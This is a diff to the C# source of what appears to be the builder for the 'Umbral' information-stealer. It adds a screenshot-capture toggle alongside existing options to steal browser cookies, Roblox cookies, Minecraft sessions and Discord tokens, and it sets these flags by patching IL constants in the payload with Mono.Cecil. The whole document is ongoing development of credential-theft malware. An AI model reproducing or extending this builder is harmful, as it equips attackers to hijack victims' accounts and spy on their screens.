@@ -2,13 +2,10 @@
 using Mono.Cecil.Cil;
 using Mono.Cecil;
 using System;
-using System.CodeDom.Compiler;
 using System.IO;
-using System.IO.Compression;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
-using Microsoft.CSharp;
 using Mono.Cecil.Rocks;
 using Vestris.ResourceLib;
 
@@ -46,6 +43,7 @@ namespace Umbral.builder.Build
         public bool StealCookies;
         public bool StealRobloxCookies;
         public bool StealMinecraftSession;
+        public bool CaptureScreenshot;
 
         public AssemblyInfo AssemblyInformation;
 
@@ -137,6 +135,10 @@ namespace Umbral.builder.Build
                             case 8: // stealDiscordTokens  
                                 instruction.OpCode = OpCodes.Ldc_I4;
                                 instruction.Operand = StealTokens ? 1 : 0;
+                                break;
+                            case 9: // takeScreenshot  
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = CaptureScreenshot ? 1 : 0;
                                 break;
                         }
                     }
